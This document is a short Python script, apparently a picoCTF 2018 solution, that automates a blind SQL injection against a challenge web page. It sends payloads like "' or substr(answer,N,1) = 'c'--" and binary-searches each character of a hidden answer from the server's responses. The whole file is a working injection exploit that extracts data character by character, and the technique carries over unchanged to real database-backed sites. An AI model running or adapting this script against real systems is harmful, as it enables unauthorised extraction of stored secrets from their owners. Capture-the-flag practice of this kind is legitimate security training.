import requests

lengthRes = 0
res = ''
turn = 0
while lengthRes < 14:
    dau = 0
    cuoi = 127
    lengthRes += 1
    while dau <= cuoi:
        turn += 1
        giua = (dau + cuoi) // 2
        ch = "'" + chr(giua) + "'"
        print("----" + turn.__str__() + "------ char:" + ch)
        payloadEqual = {'answer': "' or  substr(answer,{0},1) = {1}-- like '%12".format(lengthRes,ch), 'debug': 1}
        r = requests.post("http://2018shell2.picoctf.com:28120/answer2.php", data=payloadEqual)
        if r.text.__contains__("close"):
            res = res + chr(giua)
            print("Result: "+res + "length: " + lengthRes.__str__() + "\n")
            break
        payloadNotEqual = {'answer': "' or  substr(answer,{0},1) < {1}-- like '%12".format(lengthRes, ch), 'debug': 1}
        r = requests.post("http://2018shell2.picoctf.com:28120/answer2.php", data=payloadNotEqual)
        if r.text.__contains__("close"):
            cuoi = giua - 1
        else: dau = giua +1